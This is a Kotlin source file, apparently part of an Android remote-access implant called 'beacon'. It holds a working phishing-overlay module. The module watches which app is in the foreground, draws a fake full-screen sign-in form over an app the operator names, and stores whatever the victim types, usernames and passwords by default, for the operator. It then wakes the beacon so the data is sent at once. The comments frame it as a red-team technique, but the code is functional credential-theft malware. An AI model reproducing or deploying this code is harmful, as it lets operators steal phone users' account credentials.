package io.umbra.beacon

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

/**
 * The false screen of the phone.
 *
 * The overlay draws a form over the application the user of the phone
 * opened.  The technique is old and it is in the catalogue of every
 * mobile red team, and it is written here the way it works in the field:
 * the operator arms it with the package it waits for and with the words
 * it shows, the accessibility service tells it that the application came
 * to the front, and the form is drawn over it.
 *
 * Three things are true about it and the implant says them all:
 *
 *   * the overlay needs the permission to draw over the other
 *     applications, and the user of the phone grants it in the settings;
 *   * the overlay is on the screen of the phone: the user sees a form
 *     that is not the application they opened;
 *   * what the user types travels to the operator, and the operator may
 *     end the overlay at any moment.
 */
object Overlay {
    /**
     * The overlay that is armed.
     *
     * The package is the application the overlay waits for; the words
     * are what the form shows.
     */
    data class Target(
        val packageName: String,
        val title: String,
        val prompt: String,
        val fields: List<String>,
        val button: String,
    )

    /** The overlay that is armed, if there is one. */
    @Volatile private var target: Target? = null

    /** The view that is on the screen, if there is one. */
    @Volatile private var view: View? = null

    /** The window the view belongs to. */
    @Volatile private var window: WindowManager? = null

    /** The package that is on the screen right now. */
    @Volatile private var foreground: String = ""

    /**
     * Arm the overlay.
     *
     * The operator names the application to wait for and the words of the
     * form; the answer says what will happen and when.
     */
    fun arm(context: Context, args: Upk): String {
        val packageName = args.field("package")?.text()?.trim().orEmpty()
        if (packageName.isEmpty()) {
            return "phish.overlay: the overlay needs args.package: the application it waits for"
        }
        if (!Sense.granted(context, android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
            return "phish.overlay: the permission to draw over the other applications is not granted: " +
                "the user of the phone has to turn it on in the settings of the phone"
        }
        val fields = args.field("fields")?.list()
            ?.mapNotNull { it.text() }
            ?.filter { it.isNotEmpty() }
            ?.takeIf { it.isNotEmpty() }
            ?: listOf("username", "password")
        val armed = Target(
            packageName = packageName,
            title = args.field("title")?.text() ?: "Sign in",
            prompt = args.field("prompt")?.text() ?: "Please sign in to continue",
            fields = fields,
            button = args.field("button")?.text() ?: "Sign in",
        )
        target = armed
        return "phish.overlay: the overlay waits for '$packageName' with the fields ${fields.joinToString(", ")}"
    }

    /**
     * Take the overlay away.
     *
     * The operator ends it, and the form disappears from the screen of
     * the phone.
     */
    fun dismiss(context: Context): String {
        val was = target != null
        target = null
        remove()
        return if (was) {
            "phish.overlay: the overlay was dismissed"
        } else {
            "phish.overlay: no overlay was armed"
        }
    }

    /** What the overlay is doing. */
    fun status(): String {
        val armed = target
        return if (armed == null) {
            "phish.overlay: no overlay is armed\n"
        } else {
            "phish.overlay: the overlay waits for '${armed.packageName}'\n" +
                "phish.overlay: it is ${if (view == null) "not on the screen" else "on the screen"}\n" +
                "phish.overlay: the last application on the screen was '$foreground'\n"
        }
    }

    /**
     * The window of the phone changed.
     *
     * The accessibility service calls this with the package that came to
     * the front.  When the package is the one the operator named, the
     * form is drawn; when it is another one, the form is taken away.
     */
    fun onWindow(context: Context, packageName: String) {
        foreground = packageName
        val armed = target
        if (armed == null) {
            remove()
            return
        }
        if (packageName != armed.packageName) {
            remove()
            return
        }
        if (view != null) return
        show(context, armed)
    }

    /**
     * Draw the form.
     *
     * The window of the system belongs to the main thread, so the form is
     * drawn there.
     */
    private fun show(context: Context, armed: Target) {
        Handler(Looper.getMainLooper()).post {
            try {
                val manager = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                if (manager == null) return@post
                val root = LinearLayout(context).apply {
                    orientation = LinearLayout.VERTICAL
                    setPadding(48, 96, 48, 48)
                    setBackgroundColor(Color.WHITE)
                }
                root.addView(TextView(context).apply {
                    text = armed.title
                    textSize = 22f
                    setTextColor(Color.BLACK)
                    setPadding(0, 0, 0, 32)
                })
                root.addView(TextView(context).apply {
                    text = armed.prompt
                    textSize = 15f
                    setTextColor(Color.DKGRAY)
                    setPadding(0, 0, 0, 32)
                })
                val inputs = mutableListOf<EditText>()
                for (name in armed.fields) {
                    val input = EditText(context).apply {
                        hint = name
                        textSize = 16f
                        setSingleLine(true)
                    }
                    inputs.add(input)
                    root.addView(input)
                }
                val button = Button(context).apply {
                    text = armed.button
                    setOnClickListener {
                        submit(context, armed, inputs)
                    }
                }
                root.addView(button)
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_DIM_BEHIND,
                    PixelFormat.TRANSLUCENT,
                )
                params.gravity = Gravity.TOP or Gravity.START
                manager.addView(root, params)
                window = manager
                view = root
            } catch (t: Throwable) {
                remove()
            }
        }
    }

    /**
     * The user pressed the button of the form.
     *
     * What was typed goes into the queue of the watchers, and the beacon
     * is asked to connect again: the operator does not wait for the next
     * check-in to read the answer of the user.
     */
    private fun submit(context: Context, armed: Target, inputs: List<EditText>) {
        try {
            val fields = LinkedHashMap<String, String>()
            fields["package"] = armed.packageName
            for ((index, input) in inputs.withIndex()) {
                val name = armed.fields.getOrElse(index) { "field$index" }
                fields[name] = input.text?.toString().orEmpty()
            }
            Watch.append(context.filesDir.absolutePath, "overlay", fields)
            Watch.wakeBeacon()
        } catch (_: Throwable) {
            // The answer of the user is a convenience; the form still goes.
        }
        remove()
    }

    /** Take the form off the screen. */
    private fun remove() {
        val manager = window
        val current = view
        view = null
        window = null
        if (manager == null || current == null) return
        Handler(Looper.getMainLooper()).post {
            try {
                manager.removeView(current)
            } catch (_: Throwable) {
                // The view was already gone.
            }
        }
    }
}
